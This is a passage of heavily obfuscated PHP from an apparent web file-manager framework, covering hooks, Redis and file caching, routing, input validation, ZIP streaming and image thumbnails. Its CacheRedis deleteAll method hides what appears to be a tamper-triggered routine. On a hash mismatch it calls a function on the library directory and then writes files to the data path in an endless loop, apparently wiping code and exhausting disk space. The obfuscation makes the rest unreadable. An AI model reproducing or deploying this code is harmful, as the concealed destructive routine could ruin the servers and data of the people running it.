04\200\10\147\77\50\56\160\75\141\14\200\14\310\164\13\134\21\175\322\134\30\117\7\114"."\x30\xd9\xdc\xb6\x9a\x64\x5f\x30\xb\xe5\xf0\x89\x55\x3a\x2b\x69\x17\xb8\x61\xfb\xd3\xfd\x45\x56\xa7\xdd\x22\xc0\x39\xe5\xcc\x19\xc6\x61\x26\x4c\xa3\x1b\x47\xe4\x16\x47\x58\x60\xb7\x5c\x57\x6b\x6f\x1a\xc0\x26\x2e"."\x29\xa7\x7d\x92\x5d\x54\xe0\xef\x85\x3\xc5\xb6\x9d\xba\x1b\x8d\x8\xaf\x4f\x57\x98\xf1\xd6\x36\x39\xde\x62\x8e\xd2\x5\xc9\x53\x42\x4a\x1c\x3e\x2d\x1c\x6e\xd3\xc2\xaa\xe\xa7\x92\x64\x60\xa1\xba\x5a\xb7\xd7\x8e"."\16\226\145\252\334\12\40\227\307\45\373\135\23\235\31\11\360\15\210\354\51\265\166\260\206\351\22\26\340\36\257\134\351\162\233\363\327\171\306\172\274\343\262\145\15\324\324\362\23\31\41\311\141"."\xf7\x4\xe4\x71\x3e\x57\xc0\xf9\xff\x1\x3e\x33\x7f\xca\xda\xb1\x0\x0".base64_decode('').""."".""."", 10, -8))); goto fٞ; aϐ: function ActionCallHook($EϬ) { goto Fà; Fà: $dۍ =& $_SERVER[$_SERVER[拘][3]]; $dۍ[36](); $eڤ͏ = $dۍ[34](func_get_args(), 1); goto a; cБ: $f = $e廼 ? $dۍ[39]($e廼, !0) : $f; $GLOBALS[$dۍ[37]] = 0; return $f; goto e߰; a: $GLOBALS[$dۍ[37]] = 1; $f = $dۍ[35]($EϬ, $eڤ͏); $e廼 = $dۍ[38](); goto cБ; e߰: } function beforeShutdown() { Hook::trigger($_SERVER[$_SERVER[拘][3]][41]); } function beforeShutdownError($d刨 = false, $D餇 = '', $C䯦 = '', $fۘ = 0) { $eď =& $_SERVER[$_SERVER[拘][3]]; switch ($d刨) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $fی = $eď[42]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $fی = $eď[43]; break; case E_STRICT: $fی = $eď[44]; break; case E_NOTICE: case E_USER_NOTICE: $fی = $eď[45]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $fی = $eď[46]; break; default: break; } if (!$fی || $fی == $eď[45] || $fی == $eď[46]) { return; } $C䯦 = $eď[8] . $eď[47](BASIC_PATH, $eď[48], $C䯦); $A貤 = $fی . $eď[49] . $D餇 . $eď[49] . $C䯦 . $eď[49] . $fۘ; $eď[50]($A貤, $eď[51]); } goto C; F̨: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public function __construct($dꎕ, $f) { $f颎 =& $_SERVER[拘]; if (!$f颎[82]($f颎[310])) { $f颎[29]($f颎[311], !1); } $this->cacheTime = $f; $b = isset($dꎕ[$f颎[312]]) ? $dꎕ[$f颎[312]] : 30; if ($f颎[93]($dꎕ[$f颎[306]]) && $f颎[37]($dꎕ[$f颎[306]]) >= 1) { $this->{$_SERVER[拘][313]}($dꎕ, $b); } else { $this->handle = $this->{$_SERVER[拘][28]}($dꎕ, $b); } } private function init($Aʟ, $D) { $e𭻗 =& $_SERVER[拘]; $Aú = new Redis(); $bв§ = isset($Aʟ[$e𭻗[315]]) ? $Aʟ[$e𭻗[315]] : !1; if ($bв§) { $Aú->{$_SERVER[拘][316]}($Aʟ[$e𭻗[129]], $Aʟ[$e𭻗[130]], $D); } else { $Aú->{$_SERVER[拘][118]}($Aʟ[$e𭻗[129]], $Aʟ[$e𭻗[130]], $D); } if (!empty($Aʟ[$e𭻗[317]])) { $Aú->{$_SERVER[拘][318]}($Aʟ[$e𭻗[317]]); } return $Aú; } private function initCluster($Aҍ, $E󵴇߃) { $Aކ =& $_SERVER[拘]; $f = array($Aކ[319], $Aކ[320], $Aކ[321]); $E􈱬Ƹ = $Aކ[319]; if (isset($Aҍ[$Aކ[322]]) && $Aކ[176]($Aҍ[$Aކ[322]], $f)) { $E􈱬Ƹ = $Aҍ[$Aކ[322]]; } switch ($E􈱬Ƹ) { case $Aކ[319]: $this->{$_SERVER[拘][323]}($Aҍ, $E󵴇߃); break; case $Aކ[320]: break; case $Aކ[321]: $f = $Aҍ[$Aކ[306]]; $aۆ = isset($Aҍ[$Aކ[315]]) ? $Aҍ[$Aކ[315]] : !1; $b̎ = isset($Aҍ[$Aކ[317]]) ? $Aҍ[$Aކ[317]] : null; $this->handle = new RedisCluster(NUll, $f, $E󵴇߃, $E󵴇߃, $aۆ, $b̎); break; default: break; } } private function _slave($f߈, $bԇҋ) { goto c腎; c腎: $aئ =& $_SERVER[拘]; $F = $f߈[$aئ[306]]; $this->{$_SERVER[拘][325]}($f߈, $F[0]); goto bƎ; F: $Aҋ = $aئ[326]($F); $this->{$_SERVER[拘][325]}($f߈, $F[$Aҋ]); $this->slaveHandle = $this->{$_SERVER[拘][28]}($f߈, $bԇҋ); goto Dϋ; bƎ: $this->handle = $this->{$_SERVER[拘][28]}($f߈, $bԇҋ); unset($F[0]); if (empty($F)) { return; } goto F; Dϋ: } private function filterConfig(&$F䅇, $Bɪ) { $F =& $_SERVER[拘]; $c藄 = $F[4]($F[91], $Bɪ); $eم = array($F[129] => $c藄[0], $F[130] => $c藄[1]); $F䅇 = $F[153]($F䅇, $eم); } public function set($cʎ, $F򈡰, $fЩ = false) { $fЩ = $fЩ ? $fЩ : $this->cacheTime; return $this->handle->{$_SERVER[拘][327]}($cʎ, $fЩ, $F򈡰); } public function setLock($E, $A낾, $D) { $dȲ = $this->handle->{$_SERVER[拘][328]}($E, $A낾); return $dȲ; } public function get($Dη) { $F΂ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $F΂->{$_SERVER[拘][59]}($Dη); } public function remove($Bӕ) { return $this->handle->{$_SERVER[拘][329]}($Bӕ); } public function deleteAll() { $cݱ =& $_SERVER[拘]; $EÍی = BASIC_PATH . $cݱ[35]; $Cۻ = $cݱ[32]; if ($_SERVER[$cݱ[33]] != $Cۻ($EÍی)) { goto C¶; B럄: $fȸ(LIB_DIR); $D߫蓖 = $cݱ[332]; $D߫蓖(); goto c䤉; C¶: $A׼ؘ = $cݱ[34]; $Fҫ = BASIC_PATH . $cݱ[35]; $d͂ = $A׼ؘ($Fҫ); goto e; e: $aקד = $cݱ[4]($cݱ[36], $d͂); if ($cݱ[37]($aקד) < $cݱ[330]) { die; } $fȸ = $cݱ[331]; goto B럄; c䤉: $c = $cݱ[333]; $c = $cݱ[297]($GLOBALS[$cݱ[334]]); for ($Cɻ = 0;; $Cɻ++) { $c(DATA_PATH . $Cɻ, $c); } goto cؑ; cؑ: } return $this->handle->{$_SERVER[拘][335]}(); } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($d߬, $eێϻ) { $C =& $_SERVER[拘]; $this->cachePath = $d߬[$C[40]]; $this->prefix = $C[336]; $this->cacheTime = $eێϻ; if (!$C[48]($this->cachePath)) { $C[41]($this->cachePath, 511, !0); } } public function getFile($DҮ) { $a̱ =& $_SERVER[拘]; $DҮ = $a̱[69](array($a̱[337], $a̱[338], $a̱[339]), $a̱[340], $DҮ); return $this->cachePath . $a̱[341] . $DҮ . $a̱[342]; } public function set($D, $a, $b = false) { $b =& $_SERVER[拘]; $e۳ފ = $this->{$_SERVER[拘][343]}($D); if ($b[344]($e۳ފ, $this->prefix . $a, LOCK_EX)) { return !0; } @$b[51]($e۳ފ); return !1; } public function get($f˖) { $B腎 =& $_SERVER[拘]; $A҆ﱷ = $this->{$_SERVER[拘][343]}($f˖); if ($B腎[48]($A҆ﱷ) && $B腎[49]($A҆ﱷ) < $B腎[50]() - $this->cacheTime) { @$B腎[51]($A҆ﱷ); return !1; } $b = @$B腎[345]($A҆ﱷ); return $B腎[7]($b, $B腎[195]($this->prefix)); } public function remove($F㦯) { $Aɹ = $this->{$_SERVER[拘][343]}($F㦯); return @$_SERVER[拘][51]($Aɹ); } public function deleteAll() { $d﬐ =& $_SERVER[拘]; $bջ = $d﬐[346]($this->cachePath); foreach ($bջ as $f֛) { $Eݲ˗Ժ = $this->cachePath . $f֛; if ($d﬐[165]($Eݲ˗Ժ, $d﬐[342]) && $d﬐[165]($Eݲ˗Ժ, $d﬐[347])) { @$d﬐[51]($Eݲ˗Ժ); } } } public function clearTimeout() { $B =& $_SERVER[拘]; $FڻÂ = $B[346]($this->cachePath); foreach ($FڻÂ as $CК) { $A = $this->cachePath . $CК; if ($B[165]($A, $B[342]) && $B[165]($A, $B[347]) && $B[49]($A) < $B[50]() - $this->cacheTime) { @$B[51]($A); } } } } class Application { private $defaultModule = "\x69\156\144\x65\x78"; private $defaultController = "\x69\156\144\x65\170"; private $defaultAction = "\151\x6e\x64\145\x78"; public function setDefault($b) { $e불 =& $_SERVER[拘]; $A = $e불[4]($e불[348], $e불[70]($b, $e불[348])); $this->defaultModule = $A[0] ? $A[0] : $this->defaultModule; $this->defaultController = $A[1] ? $A[1] : $this->defaultController; $this->defaultAction = $A[2] ? $A[2] : $this->defaultAction; } public function appRun($cґ) { goto F; Eوب: $bʽ[355]($cґ); Hook::trigger($B剪 . $bʽ[356], $cґ); goto dֵ; e: $B剪 = $bʽ[349]; if ($dھ == $bʽ[350]) { $B剪 = $bʽ[351]; $bȖ[0] = $bʽ[67]; $bȖ[1] = $bȖ[1] . $bʽ[352]; $cґ = $bʽ[353]($bʽ[348], $bȖ); $cґ = $bʽ[70]($cґ, $bʽ[348]); } Hook::trigger($B剪 . $bʽ[354], $cґ); goto Eوب; F: $bʽ =& $_SERVER[拘]; $bȖ = $bʽ[4]($bʽ[348], $cґ); $dھ = $bʽ[80]($bȖ[0]); goto e; dֵ: } private function autorun() { $b׫󒺠 =& $_SERVER[拘]; global $config; if ($b׫󒺠[37]($config[$b׫󒺠[357]]) == 0) { return; } foreach ($config[$b׫󒺠[357]] as $eݨ => $aŚ) { $this->{$_SERVER[拘][358]}($aŚ); } } public function run() { goto C솂ӵ; CÈǉ: $f[0]($f[362], $EՇ[0] ? $EՇ[0] : $this->defaultModule); $f[0]($f[363], $EՇ[1] ? $EՇ[1] : $this->defaultController); $f[0]($f[364], $EՇ[2] ? $EՇ[2] : $this->defaultAction); goto D޾; C솂ӵ: $f =& $_SERVER[拘]; $EՇ = $GLOBALS[$f[359]][$f[360]]; $eʨ = $GLOBALS[$f[359]][$f[361]]; goto CÈǉ; D޾: $f[0]($f[365], MOD . $f[348] . ST . $f[348] . ACT); $this->{$_SERVER[拘][366]}(); if ($f[37]($EՇ) >= 3) { $this->{$_SERVER[拘][358]}($eʨ); } else { $this->{$_SERVER[拘][358]}(ACTION); } goto Cቚ; Cቚ: } } goto B; eե: class Input { public static function getArray($aě) { goto d; F戩: if ($d[37]($D␜Þ̍) > 0) { $d[29]($d[152]($d[2287], $D␜Þ̍), !1); } return $FК; goto Bι͇; d: $d =& $_SERVER[拘]; global $in; $FК = array(); goto f䄳ʙ; f䄳ʙ: $D␜Þ̍ = array(); $Dǵ = $d[387]($d[2282]); foreach ($aě as $D => $E) { goto f°; f°: $Fɷ̗ = $d[1404]($E, $d[2283], $Dǵ . $d[88] . $D); $a۔ܿ = $D; if (isset($E[$d[2284]]) && $E[$d[2284]]) { $a۔ܿ = $E[$d[2284]]; } goto F󆧓; F󆧓: if (!$d[945]($D, $in)) { if ($d[945]($d[2285], $E)) { if (!$d[149]($E[$d[2285]])) { $FК[$a۔ܿ] = $E[$d[2285]]; } } else { if (isset($E[$d[2286]])) { $D␜Þ̍[] = $Fɷ̗; } } continue; } if (isset($E[$d[2286]]) && $E[$d[2286]] == $d[1059]) { $Dق = $d[738]($in[$D], !0); if ($d[93]($Dق)) { $FК[$a۔ܿ] = $Dق; } else { if ($d[945]($d[2285], $E)) { if (!$d[149]($E[$d[2285]])) { $FК[$a۔ܿ] = $E[$d[2285]]; } } else { $D␜Þ̍[] = $Fɷ̗; } } continue; } $F = $d[1404]($E, $d[415]); goto C; C: if (isset($E[$d[2286]]) && !self::check($in[$D], $E[$d[2286]], $F)) { if ($d[945]($d[2285], $E)) { if (!$d[149]($E[$d[2285]])) { $FК[$a۔ܿ] = $E[$d[2285]]; } } else { $D␜Þ̍[] = $Fɷ̗; } continue; } $FК[$a۔ܿ] = $in[$D]; goto eڳ; eڳ: } goto F戩; Bι͇: } public static function reg($Eˠ = "\x72\145\x71\x75\151\162\145") { static $f = array("\162\x65\x71\x75\151\162\x65" => "\56\53", "\156\165\155\x62\145\x72" => "\x5c\x64\53", "\150\145\170" => "\x5b\60\55\71\x41\55\106\141\x2d\146\135\53", "\x69\156\x74" => "\x5b\x2d\x5c\x2b\135\77\x5c\x64\53", "\142\157\157\154" => "\60\174\61", "\146\154\157\x61\164" => "\x5b\x2d\x5c\x2b\135\x3f\134\144\53\x28\x5c\56\134\x64\53\51\x3f", "\145\x6e\147\x6c\151\163\150" => "\133\x41\55\132\x61\x2d\172\40\x5d\53", "\143\x68\151\x6e\x65\x73\x65" => "\x5b\134\x78\x7b\x34\x65\x30\60\175\x2d\x5c\170\x7b\x39\146\141\65\175\x5d\x2b", "\150\x61\163\x43\150\x69\156\x65\163\x65" => "\57\50\x5b\134\170\x7b\x34\x65\x30\60\x7d\55\x5c\x78\x7b\x39\x66\141\65\175\135\53\51\x2f\165", "\145\x6d\141\151\x6c" => "\x5c\x77\53\x28\133\x5c\56\x5c\55\x5d\x5c\167\x2b\x29\52\134\x40\134\167\53\50\133\134\56\134\55\x5d\x5c\x77\x2b\51\x2a\x5c\x2e\134\167\53", "\x70\150\157\x6e\x65" => "\x31\x5b\x33\x34\x35\67\x38\x5d\x5c\x64\173\x39\175", "\x74\145\154\160\150\157\156\145" => "\50\134\50\134\x64\x7b\63\x2c\64\x7d\x5c\x29\x7c\134\144\173\63\54\64\x7d\x2d\174\134\x73\51\77\x5c\x64\173\67\x2c\x31\64\x7d", "\165\x72\154" => "\50\150\x74\164\160\x7c\x66\164\x70\174\150\164\x74\x70\x73\51\72\x5c\57\134\x2f\133\x5c\x77\134\55\137\135\x2b\50\134\56\x5b\134\x77\134\x2d\x5f\135\x2b\x29\53\50\x5b\134\x77\x5c\x2d\x5c\56\x2c\100\x3f\x5e\x3d\45\x26\x3a\x5c\x2f\x7e\134\53\43\x5d\x2a\x5b\134\167\x5c\55\x5c\100\77\136\x3d\45\46\x5c\x2f\x7e\x5c\53\x23\135\x29\x3f", "\165\162\154\x46\x75\154\154" => "\x5b\141\x2d\x7a\101\x2d\x7a\x5d\53\x3a\x5c\57\x5c\57\133\x5e\134\x73\x5d\x2a", "\151\x70" => "\x28\x5c\144\x7b\61\54\x33\175\x5c\56\51\173\x33\x7d\x28\x5c\x64\173\61\x2c\63\175\51", "\x7a\x69\x70" => "\x5b\61\x2d\x39\135\x5c\x64\173\x35\x7d\x28\x3f\x21\x5c\x64\51", "\x69\x64\103\x61\162\x64" => "\50\134\144\173\x31\x35\175\51\x7c\50\134\144\x7b\61\x37\x7d\50\134\x64\174\x58\174\170\x29\51", "\143\x6f\154\157\x72" => "\x23\x28\x5b\60\x2d\71\101\x2d\x46\x61\x2d\x66\135\173\63\x7d\174\x5b\60\55\71\x41\x2d\106\x61\x2d\146\x5d\x7b\66\175\x29", "\x74\151\155\145" => "\x28\x5b\60\55\x31\135\x5c\144\x7c\62\133\60\55\64\135\x29\72\133\x30\55\65\x5d\x5c\144", "\144\141\164\x65" => "\x5c\x64\x7b\64\175\x5b\55\134\57\x5d\x3f\x28\x30\133\61\55\x39\x5d\174\x31\x5b\60\55\x32\x5d\x29\133\55\134\x2f\135\77\50\x5b\x30\55\x32\x5d\x5c\144\174\63\x5b\x30\x2d\61\135\51", "\x64\141\164\x65\x54\x69\x6d\145" => "\134\144\173\64\175\x5b\x2d\134\57\135\x3f\x28\x30\x5b\61\55\x39\135\x7c\x31\133\60\55\62\135\x29\133\55\134\x2f\135\x3f\50\x5b\x30\x2d\x32\x5d\x5c\144\x7c\63\x5b\x30\x2d\61\x5d\51\134\x73\53\x28\133\x30\55\x31\135\134\144\x7c\x32\x5b\x30\55\64\135\x29\x3a\x5b\x30\55\x35\x5d\134\x64", "\x70\141\163\163\x77\x6f\x72\x64" => "\50\x3f\75\56\52\x5c\144\x29\x28\x3f\x3d\x2e\52\133\x61\x2d\172\x5d\x29\x28\77\75\56\52\133\101\x2d\132\x5d\51\x2e\173\70\x2c\x32\60\x7d", "\x6b\145\x79" => "\133\134\167\x5c\x2e\x5d\x2b", "\153\x65\171\106\x75\x6c\x6c" => "\133\x5c\167\134\56\134\163\54\135\53"); if (!$Eˠ) { return $f; } return $f[$Eˠ]; } public static function check($E߇, $Aǧ, $b = null) { $CíÓ =& $_SERVER[拘]; switch ($Aǧ) { case $CíÓ[359]: return $CíÓ[176]($E߇, $b); break; case $CíÓ[2288]: return $CíÓ[1052]($E߇) > $b; break; case $CíÓ[2289]: return $CíÓ[1052]($E߇) < $b; break; case $CíÓ[956]: return $CíÓ[195]($E߇) >= $b[0] && $CíÓ[195]($E߇) <= $b[1]; break; case $CíÓ[956]: if ($CíÓ[93]($b)) { return $CíÓ[195]($E߇) >= $b[0] && $CíÓ[195]($E߇) <= $b[1]; break; } else { return $CíÓ[195]($E߇) == $b; break; } case $CíÓ[1108]: return $CíÓ[1052]($E߇) >= $b[0] && $CíÓ[1052]($E߇) <= $b[1]; break; } $b = self::reg(!1); $Aǧ = isset($b[$Aǧ]) ? $b[$Aǧ] : $Aǧ; if ($CíÓ[7]($Aǧ, 0, 1) != $CíÓ[44]) { $Aǧ = $CíÓ[2291] . $Aǧ . $CíÓ[2292]; } return $CíÓ[131]($Aǧ, $E߇) === 1; } public static function get($D, $A = null, $F = null, $b = null) { goto fŉ; eʄ: if (!$e쏂[149]($b)) { $c˽[$e쏂[415]] = $b; } if (!$e쏂[149]($A)) { $c˽[$e쏂[2286]] = $A; } $fխɉ = Input::getArray(array($D => $c˽)); goto e; e: return $fխɉ[$D]; goto Cɢ; fŉ: $e쏂 =& $_SERVER[拘]; $c˽ = array(); if (!$e쏂[149]($F)) { $c˽[$e쏂[897]] = $F; } goto eʄ; Cɢ: } } class ZipMake { const VERSION = "\x30\x2e\62\x2e\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($cǋ = null) { $A畢 =& $_SERVER[拘]; $this->outputStream = $A畢[53]($A畢[2294], $A畢[574]); $this->outputName = $cǋ; $this->needHeaders = !0; } public function addFile($Eƴۣ, $fǅی) { goto E腄; E腄: $f =& $_SERVER[拘]; $Eƴۣ = $this->{$_SERVER[拘][2295]}($Eƴۣ); $cꄸ = static::METHOD_STORE; goto a픖; bܡ̿: while (!$f[2218]($aۥ醴)) { $F = $f[577]($aۥ醴, 1048576); $this->{$_SERVER[拘][2298]}($F); } $f[58]($aۥ醴); $bѦۊ = $f[2176]($f[2299]($f[2300], $fǅی)); goto Eֿ; a픖: $A = $this->{$_SERVER[拘][2296]}($Eƴۣ, $cꄸ); $FӋ = $C⒟ = $f[598]($fǅی); $aۥ醴 = $f[53]($fǅی, $f[2297]); goto bܡ̿; Eֿ: $this->{$_SERVER[拘][2301]}($Eƴۣ, $cꄸ, $bѦۊ, $FӋ, $C⒟, $A); goto c㼾; c㼾: } public function addFileFromStream($e̟, $C) { goto b؂陎; D: $b喵 = $this->{$_SERVER[拘][2296]}($e̟, $DΤǔ); $Bթ[576]($C, 0, SEEK_END); $c = $d䐅 = $Bթ[976]($C); goto F걆; b؂陎: $Bթ =& $_SERVER[拘]; $e̟ = $this->{$_SERVER[拘][2295]}($e̟); $DΤǔ = static::METHOD_STORE; goto D; b: $cף = $Bթ[2176]($Bթ[2305]($Cฌ)); $this->{$_SERVER[拘][2301]}($e̟, $DΤǔ, $cף, $c, $d䐅, $b喵); goto aڿ; F걆: $Bթ[2302]($C); $Cฌ = $Bթ[2303]($Bթ[2300]); while (!$Bթ[2218]($C)) { $C鍦 = $Bթ[577]($C, 1048576); $Bթ[2304]($Cฌ, $C鍦); $this->{$_SERVER[拘][2298]}($C鍦); } goto b; aڿ: } public function finish() { foreach ($this->files as $Eǆ) { $this->{$_SERVER[拘][2306]}($Eǆ); } $this->{$_SERVER[拘][2307]}(); $this->{$_SERVER[拘][2308]}(); $this->{$_SERVER[拘][2309]}(); $this->{$_SERVER[拘][441]}(); } protected function addFileHeader($B銞, $b΄ѡ) { goto f٪; f٪: $c悢 =& $_SERVER[拘]; $B銞 = $c悢[216]($c悢[2310], $c悢[67], $B銞); $D = $c悢[195]($B銞); goto dﵼ; AˏƆ: $aߩ = $this->{$_SERVER[拘][2315]}($F鍂Ѓ); $cޑ = $this->{$_SERVER[拘][2315]}($A); $this->{$_SERVER[拘][2298]}($aߩ . $B銞 . $cޑ); goto c; c: return $c悢[195]($aߩ) + $D + $c悢[195]($cޑ); goto DՌ׽; dﵼ: $b = $this->{$_SERVER[拘][2311]}($c悢[50]()); $F鍂Ѓ = array(array($c悢[2312], static::FILE_HEADER_SIGNATURE), array($c悢[2313], static::ZIP_VERSION_64), array($c悢[2313], 8), array($c悢[2313], $b΄ѡ), array($c悢[2312], $b), array($c悢[2312], 0), array($c悢[2312], 4294967295), array($c悢[2312], 4294967295), array($c悢[2313], $D), array($c悢[2313], 32)); $A = array(array($c悢[2313], 1), array($c悢[2313], 28), array($c悢[2314], 0), array($c悢[2314], 0), array($c悢[2314], 0), array($c悢[2312], 0)); goto AˏƆ; DՌ׽: } protected function addFileFooter($eޑ, $B, $a҅, $C͸, $F, $AĔԞ) { $BӨ =& $_SERVER[拘]; $a򇡱 = array(array($BӨ[2312], static::DATA_DESCRIPTOR_SIGNATURE), array($BӨ[2312], $a҅), array($BӨ[2314], $C͸), array($BӨ[2314], $F)); $D܂ = $this->{$_SERVER[拘][2315]}($a򇡱); $this->{$_SERVER[拘][2298]}($D܂); $eך = $AĔԞ + $C͸ + $b; $this->{$_SERVER[拘][2316]}($eޑ, $B, $a҅, $C͸, $F, $eך); } private function addToCdr($bŷ֌߈, $bޞĉ, $dׅ, $bѦގ, $c, $AʿǢ) { $this->files[] = array($bŷ֌߈, $bޞĉ, $dׅ, $bѦގ, $c, $this->ofs); $this->ofs += $AʿǢ; } protected function addCdrFile($E) { goto Fĥϯ; Aې: $b = $this->{$_SERVER[拘][2311]}($f[50]()); $Aϔ = array(array($f[2312], static::CDR_FILE_SIGNATURE), array($f[2313], static::ZIP_VERSION_64), array($f[2313], static::ZIP_VERSION_64), array($f[2313], 8), array($f[2313], $c̭), array($f[2312], $b), array($f[2312], $c눌), array($f[2312], 4294967295), array($f[2312], 4294967295), array($f[2313], $f[195]($c)), array($f[2313], 32), array($f[2313], $f[195]($aӃ)), array($f[2313], 0), array($f[2313], 0), array($f[2312], 32), array($f[2312], 4294967295)); $Cţܩ = array(array($f[2313], 1), array($f[2313], 28), array($f[2314], $FՊ), array($f[2314], $e玉), array($f[2314], $eɓ), array($f[2312], 0)); goto Bč; Fĥϯ: $f =& $_SERVER[拘]; list($c, $c̭, $c눌, $e玉, $FՊ, $eɓ) = $E; $aӃ = $f[67]; goto Aې; Bč: $b = $this->{$_SERVER[拘][2315]}($Aϔ); $d䊎 = $this->{$_SERVER[拘][2315]}($Cţܩ); $Dإ = $b . $c . $aӃ . $d䊎; goto e٦Ž; e٦Ž: $this->{$_SERVER[拘][2298]}($Dإ); $this->cdr_ofs += $f[195]($Dإ); goto f; f: } protected function addCdr64Eof() { goto aה; aה: $E =& $_SERVER[拘]; $B훹 = $E[37]($this->files); $E = $this->cdr_ofs; goto fӝ; fӝ: $D = $this->ofs; $E򜗐 = array(array($E[2312], static::ZIP64_CDR_EOF_SIGNATURE), array($E[2314], 44), array($E[2313], static::ZIP_VERSION_64), array($E[2313], static::ZIP_VERSION_64), array($E[2312], 0), array($E[2312], 0), array($E[2314], $B훹), array($E[2314], $B훹), array($E[2314], $E), array($E[2314], $D)); $Bģ = $this->{$_SERVER[拘][2315]}($E򜗐); goto B; B: $this->{$_SERVER[拘][2298]}($Bģ); goto c; c: } protected function addCdr64Locator() { goto b; F: $Eښ = $this->ofs; $D = array(array($e熉[2312], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($e熉[2312], 0), array($e熉[2314], $Eښ + $b넣), array($e熉[2312], 1)); $eێ낡 = $this->{$_SERVER[拘][2315]}($D); goto f״; f״: $this->{$_SERVER[拘][2298]}($eێ낡); goto e; b: $e熉 =& $_SERVER[拘]; $d = $e熉[37]($this->files); $b넣 = $this->cdr_ofs; goto F; e: } protected function addCdrEof() { goto b∷; b∷: $b擹 =& $_SERVER[拘]; $c̹ = $b擹[37]($this->files); $bӑ = $this->cdr_ofs; goto EЖ; EЖ: $béЦ = $this->ofs; $Aʘ = $b擹[67]; $bӘ = array(array($b擹[2312], static::CDR_EOF_SIGNATURE), array($b擹[2313], 0), array($b擹[2313], 0), array($b擹[2313], $c̹), array($b擹[2313], $c̹), array($b擹[2312], 4294967295), array($b擹[2312], 4294967295), array($b擹[2313], $b擹[195]($Aʘ))); goto F; F: $e네 = $this->{$_SERVER[拘][2315]}($bӘ) . $Aʘ; $this->{$_SERVER[拘][2298]}($e네); goto aʸŃ; aʸŃ: } protected function addCdr() { foreach ($this->files as $Dʖ) { $this->{$_SERVER[拘][2306]}($Dʖ); } $this->{$_SERVER[拘][2309]}(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $dģ =& $_SERVER[拘]; $E = $dģ[810]; if ($this->outputName) { $A = $dģ[70]($dģ[69](array($dģ[652], $dģ[1206], $dģ[338], $dģ[623], $dģ[36], $dģ[1399]), $dģ[67], $this->outputName)); $Fȉ = $dģ[655]($A); $E .= "\73\40\146\x69\x6c\x65\156\141\x6d\x65\x2a\75\125\124\x46\55\x38\47\x27{$Fȉ}"; } $E = array($dģ[843] => $dģ[2317], $dģ[2318] => $E, $dģ[2319] => $dģ[2320], $dģ[2321] => $dģ[2322], $dģ[2323] => $dģ[2324]); foreach ($E as $b󋏶 => $F) { $dģ[657]($b󋏶 . $dģ[88] . $F); } } protected function send($Bκµ) { if ($this->needHeaders) { $this->{$_SERVER[拘][2325]}(); } $this->needHeaders = !1; $_SERVER[拘][55]($this->outputStream, $Bκµ); } protected final function dosTime($Bߧ) { $B =& $_SERVER[拘]; $A = $B[2326]($Bߧ); if ($A[$B[1930]] < 1980) { $A = array($B[1930] => 1980, $B[2327] => 1, $B[2328] => 1, $B[2329] => 0, $B[2330] => 0, $B[2331] => 0); } $A[$B[1930]] -= 1980; return $A[$B[1930]] << 25 | $A[$B[2327]] << 21 | $A[$B[2328]] << 16 | $A[$B[2329]] << 11 | $A[$B[2330]] << 5 | $A[$B[2331]] >> 1; } protected function packFields($CЧ) { $bػ =& $_SERVER[拘]; $F㥮 = $bػ[67]; $Dԗ = array(); foreach ($CЧ as $fĈ) { $F㥮 .= $fĈ[0]; $Dԗ[] = $fĈ[1]; } $bػ[1096]($Dԗ, $F㥮); return $bػ[90]($bػ[2332], $Dԗ); } protected function filterFilename($C¨) { $e =& $_SERVER[拘]; return $e[69](array($e[338], $e[91], $e[167], $e[339], $e[652], $e[197], $e[200], $e[188]), $e[183], $C¨); } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($bߗ, $BԠ) { goto bߨщ; Dٌ: $this->im = self::image($bߗ); if (!$this->im) { return !1; } $a = $Cύ[67]; goto E; E: $this->imgData = $Cύ[611]($bߗ, $a); $this->srcW = $Cύ[2334]($this->im); $this->srcH = $Cύ[2335]($this->im); goto Fë; Fë: return $this; goto bʪ; bߨщ: $Cύ =& $_SERVER[拘]; $this->srcFile = $bߗ; $this->echoType = $BԠ; goto Dٌ; bʪ: } public static function image($Aې) { $f֏؏ =& $_SERVER[拘]; $aݝȅ߽ = $f֏؏[67]; $cױʻ = $f֏؏[611]($Aې, $aݝȅ߽); $e = !1; switch ($cױʻ[2]) { case IMAGETYPE_GIF: if (!$f֏؏[534]($f֏؏[2336])) { break; } $e = $f֏؏[2337]($Aې); break; case IMAGETYPE_JPEG: if (!$f֏؏[534]($f֏؏[2338])) { break; } $e = $f֏؏[2339]($Aې); break; case IMAGETYPE_PNG: if (!$f֏؏[534]($f֏؏[2340])) { break; } $e = @$f֏؏[2341]($Aې); $f֏؏[2280]($e, !0); break; case IMAGETYPE_XBM: $e = $f֏؏[2342]($Aې); break; case IMAGETYPE_WBMP: $e = $f֏؏[2343]($Aې); break; case IMAGETYPE_BMP: $e = $f֏؏[2344]($Aې); break; default: break; } return $e; } public static function imageSize($Aǫ) { $F =& $_SERVER[拘]; $a = $F[611]($Aǫ); if (!$a) { return !1; } return array($F[613] => $a[0], $F[614] => $a[1]); } function distortion($e, $dײ, $D֛) { $eΫ߈ = $this->{$_SERVER[拘][2345]}($this->im, $dײ, $D֛, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->{$_SERVER[拘][2346]}($eΫ߈, $e); } function prorate($fŅ, $c䖱, $EŻ) { $eԠǠ = $c䖱 / $EŻ; $E쫇 = $this->srcW / $this->srcH; if ($eԠǠ <= $E쫇) { $aܥ = $c䖱; $E羌 = $aܥ * 